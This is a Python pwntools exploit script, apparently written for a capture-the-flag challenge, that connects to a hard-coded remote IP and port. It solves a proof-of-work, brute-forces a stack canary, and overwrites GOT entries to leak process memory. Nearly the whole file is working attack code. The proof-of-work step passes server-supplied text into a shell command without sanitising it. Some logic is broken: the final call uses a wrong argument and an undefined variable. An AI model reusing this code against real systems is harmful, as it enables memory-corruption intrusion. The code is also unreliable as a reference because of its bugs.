#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = remote("52.52.199.139",31337)

def pow():

    time.sleep(0.3)
    data = p.recvuntil("Solution: \n")
    chall = data.split("\n")[1].split(":")[1].strip()
    n = data.split("\n")[2].split(":")[1].strip()
    res = os.popen("./pow.py " + chall + " " + n).read()
    target = res.split("Solution: ")[1].split("->")[0].strip()
    p.sendline(target)
    time.sleep(0.2)
    
    
    

pow()

def test():

    p.send("\x00"*8)
    p.send("\x00"*8)
    p.send("\x00"*8 + "\x00"*8)
    time.sleep(0.1)
    p.interactive()


def brute_canary():

    #7 bytes to brute.
    char = ""
    i = 0
    first = "\x00" * 8 
    second = "\x00" * 8
    third = "\x00" * 8
    temp = first
    canary = ""
    while len(temp) <16: 
        for i in range(0xff):
            try:
                char = chr(i)
                temp = first + char
                p.send(temp)
                time.sleep(0.1)
                p.send(second)
                time.sleep(0.1)
                p.send(third)
                time.sleep(0.1)
                data = p.recvuntil("Go\n",timeout=10)
                if "smashing" in data:
                    continue
                else:
                    print "Hit!"
                    first = first + char
                    canary += char
                    break
            except:
                break
    print "found canary : " + canary.encode('hex') 
    print temp
    #verify 
    p.send(temp)
    time.sleep(0.3)
    p.send(second)
    time.sleep(0.3)
    p.send(third)
    time.sleep(1.2)
    print "[*]Verify.."
    data = p.recv()
    print data
    
p.recvuntil('Go\n')
#c8 is read!.
#b8 is stk_chk_fail
#c0 is 
def guess_got():

    critical = ""
    for i in range(0,0xff):
        got = 0x601028
        #a8,b0,b8
        #stk_chk_fail: 0xb0
        temp = 0xff - i 
        p.send(p64(0xffffffffffffffc8))
        time.sleep(1)
        p.send(chr(temp)) #now read_got is syscall.
        time.sleep(1)
        
        data = p.recvuntil("Go\n",timeout=10)
        print data
        if len(data) > 100:
            print "HIt!"
            critical = temp
            break
    return critical
    #get our write offset!.
    
    #now we going to modify stk_chk_fail.

def no_guess(p):

    p.send(p64(0xffffffffffffffb8))
    time.sleep(0.2)
    p.send(chr(0xf0))
    time.sleep(0.2)
    p.send("a"*50)
    time.sleep(0.2)
    #guessing we return.
    p.send(p64(0xffffffffffffffc8) + "a"*8) #return to main.
    time.sleep(0.2)
    p.send(chr(target))
    time.sleep(2)
    data = p.recv() #critical leak of current process.
    print data
    print p.recv() 
    print p.recvuntil("Go\n", timeout=10)

a = guess_got()
no_guess(a)
